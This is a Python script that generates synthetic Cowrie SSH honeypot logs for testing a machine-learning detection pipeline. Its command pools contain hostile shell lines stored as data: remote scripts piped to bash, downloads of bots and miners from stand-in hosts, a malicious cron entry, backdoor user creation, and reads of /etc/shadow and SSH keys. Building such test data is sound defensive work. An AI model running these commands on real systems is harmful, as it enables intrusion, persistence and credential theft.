"""
Synthetic Cowrie SSH Honeypot Log Generator
Generates realistic cowrie.json format logs for ML pipeline testing
Author: Abdul Ahad
"""

import json
import random
import uuid
import os
from datetime import datetime, timedelta

# ── Realistic attack data pools ──────────────────────────────────────────────

ATTACKER_IPS = [
    "185.220.101.45", "45.142.212.100", "193.32.162.8", "91.240.118.172",
    "194.165.16.11", "103.99.0.122", "92.255.57.210", "45.95.147.236",
    "179.60.150.100", "198.199.65.32", "167.71.13.196", "159.89.49.114",
    "138.197.148.152", "164.92.98.77",  "206.189.32.177", "157.245.108.55",
    "178.128.21.44",  "134.209.82.19", "104.236.198.48", "68.183.39.102",
    "5.188.86.172",   "80.82.77.139",  "222.186.15.101", "218.92.0.158",
    "117.21.191.131", "58.218.211.36", "180.129.12.93",  "211.94.20.175",
]

COUNTRIES = {
    "185.220.101.45": "Germany", "45.142.212.100": "Netherlands",
    "193.32.162.8": "Russia",    "91.240.118.172": "Ukraine",
    "194.165.16.11": "Russia",   "103.99.0.122": "India",
    "92.255.57.210": "Russia",   "45.95.147.236": "Netherlands",
    "179.60.150.100": "Brazil",  "198.199.65.32": "United States",
    "167.71.13.196": "United States", "159.89.49.114": "United States",
    "138.197.148.152": "United States", "164.92.98.77": "United States",
    "206.189.32.177": "United States", "157.245.108.55": "United States",
    "178.128.21.44": "Singapore", "134.209.82.19": "United States",
    "104.236.198.48": "United States", "68.183.39.102": "United States",
    "5.188.86.172": "Russia",    "80.82.77.139": "Netherlands",
    "222.186.15.101": "China",   "218.92.0.158": "China",
    "117.21.191.131": "China",   "58.218.211.36": "China",
    "180.129.12.93": "China",    "211.94.20.175": "China",
}

USERNAMES = [
    "root", "admin", "ubuntu", "user", "test", "guest", "oracle",
    "postgres", "mysql", "ftpuser", "pi", "vagrant", "deploy",
    "ansible", "jenkins", "git", "www-data", "nginx", "apache",
    "hadoop", "ec2-user", "centos", "debian", "support", "info",
]

PASSWORDS = [
    "123456", "password", "admin", "root", "12345678", "qwerty",
    "abc123", "letmein", "monkey", "1234567890", "password1",
    "iloveyou", "admin123", "welcome", "login", "passw0rd",
    "master", "hello", "shadow", "dragon", "pass", "test",
    "P@ssw0rd", "Admin@123", "root123", "toor", "alpine",
]

# Attack command sequences grouped by behaviour type
COMMAND_SEQUENCES = {
    "recon": [
        ["uname -a", "whoami", "id", "cat /etc/passwd", "ls /"],
        ["uname -a", "cat /proc/cpuinfo", "free -m", "df -h", "ifconfig"],
        ["id", "pwd", "ls -la", "cat /etc/issue", "hostname"],
    ],
    "persistence": [
        ["wget http://malicious.ru/bot -O /tmp/bot", "chmod +x /tmp/bot", "/tmp/bot &"],
        ["curl -s http://45.33.32.156/install.sh | bash"],
        ["echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root"],
        ["useradd -m -s /bin/bash backdoor", "echo 'backdoor:P@ss123' | chpasswd"],
    ],
    "cryptomining": [
        ["wget http://xmrig.onion/xmrig", "chmod +x xmrig", "./xmrig -o pool.minexmr.com:443 -u wallet"],
        ["curl http://mining.pool/miner.sh -o /tmp/.x", "bash /tmp/.x"],
    ],
    "lateral_movement": [
        ["cat ~/.ssh/known_hosts", "cat ~/.ssh/id_rsa", "ssh-keyscan 192.168.1.0/24"],
        ["for i in $(seq 1 254); do ping -c1 192.168.1.$i; done"],
        ["nmap -sn 10.0.0.0/24", "arp -a"],
    ],
    "data_exfil": [
        ["find / -name '*.pem' 2>/dev/null", "find / -name 'id_rsa' 2>/dev/null"],
        ["cat /etc/shadow", "cat /etc/passwd", "tar czf /tmp/data.tgz /home/*"],
        ["history", "cat ~/.bash_history", "find /var/www -name '*.php' | xargs grep -l password"],
    ],
}

USER_AGENTS = [
    "SSH-2.0-libssh2_1.8.0", "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-PuTTY_Release_0.74", "SSH-2.0-Go",
    "SSH-2.0-JSCH-0.1.54", "SSH-2.0-paramiko_2.7.2",
]

# ── Generator ────────────────────────────────────────────────────────────────

def random_timestamp(base: datetime, offset_seconds: int) -> str:
    ts = base + timedelta(seconds=offset_seconds)
    return ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def make_session_id() -> str:
    return uuid.uuid4().hex[:16]

def generate_session(base_time: datetime, offset: int, attack_type: str) -> list:
    """Generate a full attack session as a list of log events."""
    events = []
    src_ip = random.choice(ATTACKER_IPS)
    src_port = random.randint(1024, 65535)
    session = make_session_id()
    username = random.choice(USERNAMES)
    password = random.choice(PASSWORDS)
    t = offset

    # Connection event
    events.append({
        "eventid": "cowrie.session.connect",
        "timestamp": random_timestamp(base_time, t),
        "src_ip": src_ip,
        "src_port": src_port,
        "dst_port": 22,
        "session": session,
        "sensor": "honeypot-01",
        "country": COUNTRIES.get(src_ip, "Unknown"),
    })
    t += random.randint(1, 3)

    # Login attempts (1-5 failed then optional success)
    num_attempts = random.randint(1, 5)
    login_success = attack_type != "scanner"  # scanners never succeed

    for i in range(num_attempts):
        success = login_success and (i == num_attempts - 1)
        events.append({
            "eventid": "cowrie.login.failed" if not success else "cowrie.login.success",
            "timestamp": random_timestamp(base_time, t),
            "src_ip": src_ip,
            "src_port": src_port,
            "session": session,
            "username": username,
            "password": password if not success else random.choice(PASSWORDS),
            "sensor": "honeypot-01",
        })
        t += random.randint(1, 4)

    # Commands (only if logged in)
    if login_success and attack_type in COMMAND_SEQUENCES:
        cmds = random.choice(COMMAND_SEQUENCES[attack_type])
        for cmd in cmds:
            events.append({
                "eventid": "cowrie.command.input",
                "timestamp": random_timestamp(base_time, t),
                "src_ip": src_ip,
                "src_port": src_port,
                "session": session,
                "input": cmd,
                "sensor": "honeypot-01",
            })
            t += random.randint(1, 8)

    # Disconnect
    events.append({
        "eventid": "cowrie.session.closed",
        "timestamp": random_timestamp(base_time, t),
        "src_ip": src_ip,
        "src_port": src_port,
        "session": session,
        "duration": t - offset,
        "sensor": "honeypot-01",
    })

    return events


def generate_logs(num_sessions: int = 500, output_path: str = "logs/cowrie.json"):
    """Main generator — writes JSONL file (one JSON object per line)."""
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    attack_types = list(COMMAND_SEQUENCES.keys()) + ["scanner", "scanner", "scanner"]
    base_time = datetime.utcnow() - timedelta(days=7)
    offset = 0
    all_events = []

    print(f"[*] Generating {num_sessions} attack sessions...")

    for i in range(num_sessions):
        attack_type = random.choice(attack_types)
        session_events = generate_session(base_time, offset, attack_type)
        all_events.extend(session_events)
        offset += random.randint(30, 600)  # sessions spread over time

        if (i + 1) % 100 == 0:
            print(f"    {i+1}/{num_sessions} sessions generated")

    # Write JSONL
    with open(output_path, "w") as f:
        for event in all_events:
            f.write(json.dumps(event) + "\n")

    print(f"[+] Done! {len(all_events)} log events written to {output_path}")
    return output_path


if __name__ == "__main__":
    generate_logs(num_sessions=500, output_path="logs/cowrie.json")
